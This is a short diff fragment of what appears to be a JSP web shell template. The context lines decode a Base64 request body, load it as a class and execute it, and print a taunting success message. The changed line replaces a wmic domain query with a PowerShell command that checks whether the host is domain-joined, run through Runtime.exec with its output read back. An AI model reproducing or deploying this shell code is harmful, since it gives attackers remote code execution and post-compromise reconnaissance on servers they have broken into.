@@ -36,7 +36,7 @@ http:
                     sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);}%>
                     <%out.print("hello friend, you got it");%>
                     <%
-            String command = "wmic computersystem get domain";
+            String command = "powershell (Get-WmiObject Win32_ComputerSystem).PartOfDomain";
             Process process = Runtime.getRuntime().exec(command);
 
             BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
